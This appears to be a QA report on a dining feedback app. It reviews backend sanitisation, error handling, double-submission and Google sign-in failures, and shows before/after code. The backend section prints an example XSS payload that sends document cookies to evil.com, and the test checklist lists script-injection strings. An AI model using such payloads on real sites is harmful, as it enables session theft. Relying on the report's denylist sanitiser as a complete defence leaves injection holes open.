# Dining Feedback System — QA Report (Phase 5)

Reviewed all phase 1–4 files. Issues found and fixed below.

---

## Phase 1 — Backend

### ✅ Race Conditions
No issue found. Backend uses `prisma.feedback.create()` with no duplicate logic.

### ❌ Sanitization — MISSING
**File:** `phase1/backend/src/routes/feedback.js`

The `comments` and `phoneNumber` fields are stored directly from `req.body` with only schema validation. No HTML/JS sanitization is performed before writing to the database. A malicious user could submit:

```js
// payload
{ "comments": "<script>fetch('https://evil.com?c='+document.cookie)</script>" }
```

This would be stored raw and rendered unsanitized in any admin dashboard that displays feedback.

**Fix:** Created `phase5/qa/sanitize.js` — a denylist-based sanitiser that strips `<script>`, `<iframe>`, `javascript:` URLs, `on*` event attributes, etc. Applied via `sanitizeBody` middleware in the feedback route.

**Before (feedback.js, lines 43–51):**
```js
const { phoneNumber, rating, comments } = req.body;
const customerEmail = req.user.email;

const feedback = await prisma.feedback.create({
  data: {
    customerEmail,
    phoneNumber: phoneNumber || null,
    rating: parseInt(rating, 10),
    comments: comments || null,   // ← stored raw — no sanitisation
  },
});
```

**After (feedback.fixed.js):**
```js
// sanitizeBody middleware runs before this handler,
// stripping dangerous patterns from req.body fields.
// comments arrives pre-sanitised here.
const { phoneNumber, rating, comments } = req.body;
const feedback = await prisma.feedback.create({
  data: { customerEmail: req.user.email, phoneNumber: phoneNumber || null,
          rating: parseInt(rating, 10), comments: comments || null },
});
```

### ❌ Error Handling — MISSING
**File:** `phase1/backend/src/app.js`

There is no global error handler. Unhandled exceptions in route handlers (e.g. database failures, null reference errors) would crash the Express process or return a bare HTML response, leaking stack traces.

The `app.js` does import `{ errorHandler }` from a middleware file, but that file does not exist:

```js
// app.js line 13
import { errorHandler } from './middleware/errorHandler.js';  // ← file not found
```

**Fix:** Created `phase5/qa/errorHandler.js` with three exports:
- `errorHandler` — catches all errors, logs them, returns safe JSON; hides stack traces in production
- `notFoundHandler` — returns 404 JSON for undefined routes
- `asyncHandler` — wrapper that eliminates need for try/catch in every async route

Also created `phase5/qa/app.fixed.js` that imports them, wires up a request-ID header, and places `errorHandler` as the last middleware (after routes and health check).

**Before (app.js — error handler missing):**
```js
// health check only
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});
// nothing else — unhandled errors leak or crash
```

**After (app.fixed.js):**
```js
// Request ID for tracing
app.use((req, res, next) => {
  req.requestId = Math.random().toString(36).slice(2);
  res.setHeader('X-Request-ID', req.requestId);
  next();
});

// ... routes ...

// 404 and global error handlers (must be last)
app.use(notFoundHandler);
app.use(errorHandler);
```

---

## Phase 2 — Frontend

### ❌ Race Conditions — DOUBLE-SUBMISSION POSSIBLE
**File:** `phase2/src/components/FeedbackForm.jsx`

The `handleSubmit` function disables the button visually (`disabled={isSubmitting}`), but does not actually prevent the async operation from running if the user clicks "Submit" twice in rapid succession. The simulated API call is just a `setTimeout`:

```js
// handleSubmit lines 50–53
setIsSubmitting(true);
await new Promise((res) => setTimeout(res, 1200));  // simulated — no actual dedup
setIsSubmitting(false);
setSubmitted(true);
```

Between the first click setting `isSubmitting=true` and the 1200 ms resolving, a second click could still enqueue a second submission since `handleSubmit` is an async function and the guard check is not atomic with the state update.

**Fix:** Created `phase5/qa/FeedbackForm.fixed.jsx` with:
1. Early-return guard: `if (isSubmitting) return;` at the top of `handleSubmit`
2. `AbortController` to cancel any in-flight request if the component unmounts or a new submission starts
3. Real `fetch()` call to `/api/feedback` with proper error handling (server validation errors surfaced per-field; network errors shown as a general banner)
4. `errors.general` state for non-field-level error messages

**Before (FeedbackForm.jsx lines 50–55):**
```js
setIsSubmitting(true);
await new Promise((res) => setTimeout(res, 1200));
setIsSubmitting(false);
setSubmitted(true);
```

**After (FeedbackForm.fixed.jsx handleSubmit):**
```js
if (isSubmitting) return;           // ← race condition guard

setIsSubmitting(true);
const controller = new AbortController();
submitControllerRef.current = controller;

try {
  const response = await fetch('/api/feedback', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({ rating, phoneNumber: phone || undefined, comments: feedbackText }),
    signal: controller.signal,
  });
  if (!response.ok) { /* parse errors, surface per-field or general */ }
  setSubmitted(true);
} catch (err) {
  if (err.name === 'AbortError') return;
  setErrors({ general: 'Network error...' });
} finally {
  if (submitControllerRef.current === controller) submitControllerRef.current = null;
}
```

### ❌ Sanitization (Frontend) — PARTIAL
The React frontend uses JSX (`{user.name}`, `{email}`) which React already escapes by default for interpolated values — so direct XSS from `{user.name}` is mitigated. However, any direct `dangerouslySetInnerHTML` usage, or rendering plain HTML strings from the backend, would be vulnerable. No explicit sanitisation layer exists on the frontend as a defence-in-depth measure.

For now, the primary fix is on the backend (sanitise at write time, not render time).

### ❌ Error Handling — MISSING
The frontend simulates a submission with `setTimeout` and shows a hardcoded success state. There is no handling for:
- Server returning a 4xx validation error with field-level messages
- Server returning 401 (not authenticated)
- Network failure

### ❌ Edge Cases — SSO DENIAL NOT HANDLED
**File:** `phase2/src/App.jsx`

`onError` in `GoogleLogin` is defined as a parameterless function:

```js
// App.jsx line 10
const handleError = () => {
  console.error('Google sign-in failed');  // no UI feedback to user
};
```

If the user declines the Google permission prompt, or closes the popup, nothing is shown — they just see the sign-in card still rendered with no indication anything went wrong. This is a poor UX.

**Fix:** Created `phase5/qa/App.fixed.jsx`:
1. `handleError(errorResponse)` now receives the error code from Google's SDK. It distinguishes `popup_closed_by_user` and `user_cancelled` (silent, no message) from real errors (shown as a dismissable error banner).
2. URL parameter detection: `?auth=error` set by the backend OAuth redirect is parsed in `useEffect` and displayed as a persistent error banner with a "Dismiss" button.
3. Added `authError` state with a dismiss button.
4. Loading spinner shown while URL params are being checked.

**Before (App.jsx — no error UI):**
```js
const handleError = () => {
  console.error('Google sign-in failed');
};
```

**After (App.fixed.jsx):**
```js
const handleError = (errorResponse) => {
  const reason = errorResponse?.error || 'unknown';
  switch (reason) {
    case 'popup_closed_by_user':
    case 'user_cancelled':
      return;  // silent — user chose not to sign in
    case 'immediate_failed':
      setAuthError('Could not sign you in automatically. Please try again.');
      break;
    default:
      setAuthError(
        'Sign-in failed. This may be because you declined permission, or there was a problem with your Google account.'
      );
  }
};
```

Also added a dismissible error banner:
```jsx
{authError && (
  <div className="mb-4 bg-red-50 border border-red-200 rounded-2xl p-4">
    <div className="flex items-start gap-3">
      <svg ... /> {/* warning icon */}
      <div>
        <p className="text-sm text-red-700 font-medium">Sign-in failed</p>
        <p className="text-xs text-red-600 mt-1">{authError}</p>
      </div>
      <button onClick={handleDismissError}>...</button>
    </div>
  </div>
)}
```

---

## Phase 3 — Empty directory

No files present. No issues.

---

## Phase 4 — Docker / Infrastructure

No backend or frontend source code present (only `Dockerfile`, `docker-compose.yml`, `nginx.conf`). The Docker and nginx configs appear reasonable. No issues found.

---

## Summary of Fixed Files

| File | Issue Fixed |
|------|-------------|
| `phase5/qa/errorHandler.js` | New — global Express error handler middleware (was missing entirely) |
| `phase5/qa/sanitize.js` | New — XSS sanitisation utilities and Express middleware (was missing) |
| `phase5/qa/app.fixed.js` | Corrected — imports and wires up errorHandler + notFoundHandler; adds request ID |
| `phase5/qa/feedback.fixed.js` | Corrected — applies sanitizeBody middleware before validation |
| `phase5/qa/FeedbackForm.fixed.jsx` | Corrected — race condition guard + AbortController; real API call; error handling |
| `phase5/qa/App.fixed.jsx` | Corrected — SSO denial error state with dismissable banner; URL param detection |

---

## Testing Checklist

- [ ] Double-click "Submit" in rapid succession — only one request fires
- [ ] Submit `<script>alert(1)</script>` as feedback comment — script tag is stripped before storage
- [ ] Submit with `javascript:alert(1)` in the comment — stripped before storage
- [ ] Submit with `onclick=` attribute in comment — stripped before storage
- [ ] Server returns 400 with field errors — errors appear under the correct field
- [ ] Server returns 401 — error banner appears
- [ ] Network goes offline during submission — "Network error" banner appears
- [ ] User denies Google permission — error banner with explanation shown
- [ ] Backend throws unhandled exception — 500 JSON response, no stack trace exposed to client
- [ ] Request to undefined route — 404 JSON response